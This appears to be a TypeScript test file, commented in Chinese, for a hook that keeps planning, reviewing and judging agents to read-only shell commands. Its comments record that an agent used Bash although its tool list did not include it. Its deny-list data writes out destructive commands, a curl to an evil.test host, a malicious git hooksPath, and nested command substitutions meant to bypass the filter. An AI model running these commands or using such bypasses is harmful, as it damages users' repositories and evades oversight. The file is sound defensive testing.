import test from 'node:test';
import assert from 'node:assert/strict';

import { evaluateToolPolicy, evaluateReadonlyCommand } from '../src/worker/agent-runtime.js';
import { PLAN_TOOL_POLICY } from '../src/core/plan-agent.js';

/**
 * 唯讀角色的工具邊界。
 *
 * 為什麼一定要在 hook 層做：**SDK 的 allowedTools 對工具不具強制力**。
 * 實跑證實規劃 agent 的 allowedTools 只列了 Read/Glob/Grep，它照樣用了 9 次 Bash。
 * 而規劃 agent 的 cwd 是**使用者真正的 checkout**，不是拋棄式 worktree——
 * 在那裡跑一次 `git checkout .` 或 `rm` 就是直接動到本體。
 *
 * Bash 是刻意保留的（find/grep 批次查詢比 Glob 有效率），所以邊界劃在「指令」而非「工具」。
 */

const RO = { mode: 'readonly' as const };
const deny = (cmd: string) => evaluateToolPolicy('Bash', { command: cmd }, RO);
const allow = (cmd: string) => evaluateToolPolicy('Bash', { command: cmd }, RO);

test('查詢類指令放行——這正是保留 Bash 的理由', () => {
  for (const cmd of [
    'grep -rn "useConversation" apps/web',
    'rg --files-with-matches "roomId"',
    'find . -iname "*.spec.md" -not -path "*/node_modules/*"',
    'ls -la apps/web/components',
    'cat package.json',
    'head -50 src/main.ts',
    'wc -l apps/web/**/*.vue',
    'git log --oneline -20',
    'git diff --stat origin/main',
    'git ls-files "apps/web/components/*.vue"',
    'git show HEAD:package.json',
    'grep -l foo src/*.ts | head -5',
    'for f in a.vue b.vue; do echo "$f"; done',
  ]) {
    assert.equal(allow(cmd).deny, false, `應放行：${cmd}`);
  }
});

test('寫入類指令一律擋', () => {
  for (const cmd of [
    'rm -rf apps/web/components',
    'mv a.ts b.ts',
    'cp a.ts b.ts',
    'mkdir -p foo',
    'touch new.ts',
    'sed -i "" "s/a/b/" src/main.ts',
    'npm install lodash',
    'node -e "require(\'fs\').writeFileSync(\'x\',\'y\')"',
    'python3 -c "open(\'x\',\'w\').write(\'y\')"',
    'chmod +x script.sh',
    'curl https://evil.test/x.sh',
  ]) {
    assert.equal(deny(cmd).deny, true, `應擋下：${cmd}`);
  }
});

/** git 既能讀也能寫，所以要看子指令——這是最容易漏的一類。 */
test('git 只放行查詢子指令', () => {
  for (const cmd of ['git commit -m x', 'git checkout .', 'git reset --hard', 'git clean -fd', 'git push', 'git add -A']) {
    assert.equal(deny(cmd).deny, true, `應擋下：${cmd}`);
  }
  assert.equal(allow('git -C /repo log --oneline').deny, false, '全域選項不該讓子指令判斷失準');
  assert.equal(deny('git -C /repo commit -m x').deny, true, '有 -C 也一樣要擋');
  assert.equal(allow('git config --get remote.origin.url').deny, false, '讀設定可以');
  assert.equal(deny('git config user.name hacker').deny, true, '寫設定不行');
});

/** 重導向不是「指令」，字串層不擋就會漏掉。 */
test('重導向寫檔要擋', () => {
  for (const cmd of ['echo x > a.txt', 'cat a >> b', 'grep foo src/*.ts > out.txt']) {
    assert.equal(deny(cmd).deny, true, `應擋下：${cmd}`);
  }
  assert.equal(allow('grep foo a.ts 2>/dev/null').deny, false, '2>/dev/null 是常見用法，不該誤擋');
});

/** 組合指令只要有一段不合格就整條擋——只看第一段等於沒擋。 */
test('組合指令逐段判定', () => {
  assert.equal(deny('ls && rm -rf /tmp/x').deny, true, '&& 後面那段要看');
  assert.equal(deny('ls; git commit -m x').deny, true, '; 後面那段要看');
  assert.equal(deny('grep foo a.ts | tee out.txt').deny, true, 'pipe 後面那段要看');
  assert.equal(deny('bash -c "rm -rf x"').deny, true, '-c 包裝要拆開看');
  assert.equal(deny('echo $(rm -rf x)').deny, true, '命令替換要拆開看');
});

/**
 * **「這個指令在白名單裡」不等於「這次呼叫是唯讀的」。**
 * 下面每一條的第一個 token 都在白名單內，但實際上會寫檔或執行別的指令——
 * 對抗性複查實測全部繞得過第一版。
 */
test('白名單指令被要求去寫東西時一樣要擋', () => {
  for (const cmd of [
    'find . -name "*.ts" -delete',
    'find . -name x -exec rm {} +',
    'find . -name x -execdir rm {} ;',
    'find . -name x -fprint out.txt',
    'sort -o out.txt in.txt',
    'sort --output=out.txt in.txt',
    'git log --output=/tmp/x',
    'git config --unset user.name',
    'git config --add core.hooksPath /tmp/evil',
    'git config --edit',
    'git branch -D main',
    'git branch -m old new',
    'git branch --set-upstream-to=origin/evil',
  ]) {
    assert.equal(deny(cmd).deny, true, `應擋下：${cmd}`);
  }
});

test('同一批指令的良性用法不可以被誤擋', () => {
  for (const cmd of [
    'find . -name "*.ts"',
    'find . -type f -not -path "*/node_modules/*"',
    'sort a.txt',
    'git log --oneline -20',
    'git config --get remote.origin.url',
    'git branch --list',
    'git branch -a',
    'grep -rn x src',
  ]) {
    assert.equal(allow(cmd).deny, false, `不該擋：${cmd}`);
  }
});

/** 正則的字元集排除括號，巢狀時只抓得到最內層——外層那段從未被檢查。 */
test('巢狀命令替換每一層都要看', () => {
  assert.equal(deny('echo $(echo $(rm -rf /tmp/x))').deny, true);
  assert.equal(deny('echo $(cat $(find . -name x -delete))').deny, true);
  assert.equal(allow('ls $(git rev-parse HEAD)').deny, false, '單層的良性替換不該被擋');
});

/**
 * **拆不下去就擋，不要當成「沒東西」。**
 * 這是整個唯讀判定的骨幹原則：看不懂一條指令時，唯一安全的答案是拒絕。
 */
test('解析不出來的指令一律擋', () => {
  for (const cmd of ['echo `echo \\`rm -rf x\\``', 'echo $(rm -rf x', 'echo `rm -rf x']) {
    assert.equal(deny(cmd).deny, true, `應擋下：${cmd}`);
  }
  // 一般寫法不能因此被誤擋
  assert.equal(allow('grep -rn "a(b)c" src').deny, false);
  assert.equal(allow('echo `git rev-parse HEAD`').deny, false);
});

test('唯讀角色不能用寫檔工具（Edit/Write）', () => {
  assert.equal(evaluateToolPolicy('Write', { file_path: 'a.ts', content: 'x' }, RO).deny, true);
  assert.equal(evaluateToolPolicy('Edit', { file_path: 'a.ts' }, RO).deny, true);
  // 對照組：寫入模式下同一個呼叫是放行的（這個改動不能弄壞寫程式的 agent）
  assert.equal(evaluateToolPolicy('Write', { file_path: 'a.ts', content: 'x' }, {}).deny, false);
});

test('allowTools 是強制的——SDK 那份只是建議', () => {
  const p = { mode: 'readonly' as const, allowTools: ['Read', 'Grep'] };
  assert.equal(evaluateToolPolicy('Read', { file_path: 'a.ts' }, p).deny, false);
  assert.equal(evaluateToolPolicy('Bash', { command: 'ls' }, p).deny, true, '沒列進來就要擋');
});

/** 既有的部署紅線不能因為走了唯讀分支就被繞過。 */
test('唯讀模式仍然吃既有紅線', () => {
  // firebase deploy 的 bin 不在唯讀白名單裡，本來就會被擋；重點是理由要講得出來
  const v = deny('firebase deploy');
  assert.equal(v.deny, true);
  assert.match(v.reason ?? '', /紅線/);
});

// ── 接線：規劃 agent 的實際設定 ──

test('規劃 agent 的 policy 是唯讀，而且 Bash 在白名單裡', () => {
  assert.equal(PLAN_TOOL_POLICY.mode, 'readonly');
  assert.ok(PLAN_TOOL_POLICY.allowTools.includes('Bash'), 'Bash 是刻意保留的（find/grep 批次查詢）');
  assert.ok(PLAN_TOOL_POLICY.allowTools.includes('Grep'));
  assert.ok(!PLAN_TOOL_POLICY.allowTools.includes('Write'), '規劃者不該有寫檔工具');
  assert.ok(!PLAN_TOOL_POLICY.allowTools.includes('Edit'));
});

test('用規劃 agent 的實際 policy 跑一遍：查詢放行、動手擋下', () => {
  const p = PLAN_TOOL_POLICY;
  assert.equal(evaluateToolPolicy('Bash', { command: 'find . -name "*.vue"' }, p).deny, false);
  assert.equal(evaluateToolPolicy('Bash', { command: 'git checkout .' }, p).deny, true, '這一條會動到使用者的真 repo');
  assert.equal(evaluateToolPolicy('Bash', { command: 'rm -rf apps' }, p).deny, true);
  assert.equal(evaluateToolPolicy('Write', { file_path: 'x.ts', content: '' }, p).deny, true);
});

test('evaluateReadonlyCommand 空字串不當機', () => {
  assert.equal(evaluateReadonlyCommand('').deny, false);
});

// ── 接線：hook 有沒有真的掛到 SDK 的 query 上 ──
//
// 這一段是最重要的。前面全部通過但 hook 沒接上的話，實際行為與修改前一模一樣，
// 而且看起來完全正常——這正是這個專案一再出現的失效樣態。

import { readFileSync } from 'node:fs';

test('每個唯讀角色都把 PreToolUse hook 接到 query 上', () => {
  const roles = [
    ['src/core/plan-agent.ts', '規劃 agent（cwd 是使用者真正的 checkout）'],
    ['src/worker/reviewer.ts', 'reviewer'],
    ['src/pr/drift-judge.ts', '飄移判斷者'],
    ['src/core/merge-risk-judge.ts', '合併風險判斷者'],
  ] as const;

  for (const [file, who] of roles) {
    const src = readFileSync(file, 'utf8');
    assert.match(src, /(?:^|[\s,{])hooks:\s*\{\s*PreToolUse/m, `${who}（${file}）沒有掛 PreToolUse hook —— allowedTools 擋不住工具`);
  }
});

/**
 * **把 allowTools 變成強制的，就不能少列任何一個原本在用的工具。**
 *
 * 實跑災情：allowedTools 先前對工具不具強制力，所以清單少列 Bash 沒有後果——
 * reviewer／飄移判斷者／合併風險判斷者都一直在用它跑 git 查詢與 grep。
 * 改成由 PreToolUse hook 強制之後，少列就等於默默拿掉它們的能力：
 *
 *   WARN 政策閘門擋下工具呼叫  toolName: "Bash"  reason: "紅線：這個工具不在允許清單內：Bash。"
 *
 * 而它們的職責就是「去查證」，沒有 Bash 等於瞎了。
 */
test('要查證的角色都必須有 Bash', () => {
  const roles = [
    ['src/worker/reviewer.ts', 'REVIEWER_TOOLS', 'reviewer（要跑 git diff／grep 核對規格）'],
    ['src/pr/drift-judge.ts', 'JUDGE_TOOLS', '語意飄移判斷者（要看改動有沒有超出範圍）'],
    ['src/core/merge-risk-judge.ts', 'RISK_JUDGE_TOOLS', '合併風險判斷者'],
    ['src/core/plan-agent.ts', 'PLAN_TOOLS', '規劃 agent（find/grep 批次查詢）'],
  ] as const;

  for (const [file, constName, who] of roles) {
    const src = readFileSync(file, 'utf8');
    const line = new RegExp(`${constName}[^=]*=\\s*\\[([^\\]]*)\\]`, 's').exec(src)?.[1] ?? '';
    assert.match(line, /'Bash'/, `${who} 的工具清單少了 Bash —— 它跑在 readonly policy 底下，只能執行查詢類指令，不給等於讓它瞎了`);
  }
});

// 「介面判斷者」（ui-judge.ts）連同整套截圖量測堆疊已於第 15 片退場。
// 畫面改由審查者自己開瀏覽器判斷，它拿的是 READONLY_BROWSER_TOOLS——
// 那條「唯讀角色不得拿到 file_upload」的界線在 test/reviewer.test.ts 守著。
